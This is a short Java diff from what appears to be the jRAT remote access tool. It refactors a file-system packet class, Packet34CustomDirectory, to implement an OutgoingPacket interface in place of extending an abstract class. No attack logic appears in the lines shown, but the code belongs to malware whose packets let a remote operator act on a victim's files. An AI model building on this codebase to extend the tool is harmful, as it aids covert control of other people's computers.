@@ -1,10 +1,10 @@
 package jrat.module.fs.packets;
 
 import jrat.client.Connection;
-import jrat.client.packets.outgoing.AbstractOutgoingPacket;
+import jrat.client.packets.outgoing.OutgoingPacket;
 
 
-public class Packet34CustomDirectory extends AbstractOutgoingPacket {
+public class Packet34CustomDirectory implements OutgoingPacket {
 
 	private String location;
 
